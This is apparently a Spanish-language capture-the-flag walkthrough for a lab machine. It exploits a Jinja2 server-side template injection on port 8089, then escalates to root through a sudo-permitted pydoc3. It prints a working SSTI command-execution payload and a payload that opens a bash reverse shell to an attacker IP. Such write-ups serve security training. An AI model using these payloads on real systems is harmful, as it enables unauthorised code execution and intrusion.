Escaneo de puertos:

![](../../../Images/Pasted%20image%2020240815142802.png)

Veamos lo que hay en el puerto 8089:

![](../../../Images/Pasted%20image%2020240815143027.png)

Coloquemos el parámetro hola por ejemplo:

![](../../../Images/Pasted%20image%2020240815143050.png)

La página misma nos devuelve lo mismo que coloquemos

Por ende explotaremos una STTI (Server Side Template Injection). Accederemos a la siguiente pagina y nos copiaremos este comando:
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---basic-injection

![](../../../Images/Pasted%20image%2020240814211729.png)

Lo pegamos con el comando whoami:
```
Hola{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('whoami').read() }}
```

![](../../../Images/Pasted%20image%2020240815143358.png)

Y damos en el botón:

![](../../../Images/Pasted%20image%2020240815143414.png)

Y nos arroja que detrás de la página está el usuario caldo

Entonces ahora meteremos un comando de reverse shell y nos pondremos a la escucha con Netcat:
```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/192.168.1.232/443 0>&1"').read() }}
```

![](../../../Images/Pasted%20image%2020240815145233.png)

![](../../../Images/Pasted%20image%2020240815145243.png)

Y listo, estamos dentro de la máquina víctima

### Tratamiento de la TTY
```
script /dev/null -c bash 
Ctrl z
stty raw -echo; fg 
reset xterm 
export SHELL=bash
export TERM=xterm
```

![](../../../Images/Pasted%20image%2020240815145315.png)

![](../../../Images/Pasted%20image%2020240815145337.png)

Flag de user:

![](../../../Images/Pasted%20image%2020240815145418.png)

## ESCALADA DE PRIVILEGIOS

Ejecutamos sudo -l para ver el binario que podremos usar 

![](../../../Images/Pasted%20image%2020240815145442.png)

Podemos ser root con el binario Pydoc3

Este es un binario que funciona de la mano con Python, por ende nos crearemos un archivo .py para que al momento de ejecutarlo con este binario seamos root automaticamente:

![](../../../Images/Pasted%20image%2020240815145819.png)

![](../../../Images/Pasted%20image%2020240815145829.png)

Lo ejecutamos:

![](../../../Images/Pasted%20image%2020240815145848.png)

Y listo, ya somos ROOT

Flag de root:

![](../../../Images/Pasted%20image%2020240815145914.png)

